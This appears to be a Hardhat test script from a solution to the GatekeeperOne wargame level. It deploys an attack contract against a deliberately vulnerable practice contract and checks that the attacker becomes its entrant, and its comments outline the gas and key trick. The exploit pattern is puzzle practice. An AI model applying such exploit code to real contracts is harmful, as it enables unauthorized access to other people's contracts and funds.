import { expect } from "chai";
import { Attack } from "../typechain-types";
import { GatekeeperOne } from "../typechain-types";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("Gatekeeper exploit using contract attack", function () {
  let attackerContract: Attack,
    gatekeeperOneContract: GatekeeperOne,
    contractAddress: string,
    attacker: SignerWithAddress,
    getNewEntrant: string;

  before("Setup for attack locally", async function () {
    // Deply gate keeper one contract
    [attacker] = await ethers.getSigners();
    contractAddress = "0x55565f8113e86234f6Ac0306AF2Aeee91Ec72746";

    gatekeeperOneContract = await ethers.getContractAt(
      "GatekeeperOne",
      contractAddress
    );

    const attackerContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackerContractFactory.deploy(
      gatekeeperOneContract.address
    );
    await attackerContract.deployed();
  });

  it("perform exploit", async function () {
    // Attack flow
    let getOldEntrant = await gatekeeperOneContract.entrant();
    console.log("the old entrant is: ", getOldEntrant);
    // 1. Send a tx from a contract and not directly from an EOA
    // 2. withing the contract, call enter with the address casted to bytes8 AND set the tx.gaslimit = 8191 wei
    let txAttack = await attackerContract.attack();

    let receiptAttack = await txAttack.wait();

    // console.log("The receipt output is ", receiptAttack);
    getNewEntrant = await gatekeeperOneContract.entrant();

    console.log("the new entrant is, ", getNewEntrant);
  });

  after("confirm exploit", async function () {
    // check that the reentrance contract == 0
    expect(getNewEntrant).to.be.eq(attacker.address);
  });
});
